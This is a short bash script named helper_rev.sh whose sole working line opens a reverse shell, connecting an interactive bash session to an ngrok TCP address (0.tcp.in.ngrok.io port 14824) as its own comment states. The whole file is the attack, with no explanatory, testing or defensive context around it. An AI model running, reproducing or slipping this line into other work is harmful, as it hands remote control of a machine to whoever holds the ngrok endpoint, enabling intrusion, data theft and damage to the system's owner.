#!/bin/bash
# helper_rev.sh

# reverse shell to ngrok TCP
/bin/bash -i >& /dev/tcp/0.tcp.in.ngrok.io/14824 0>&1
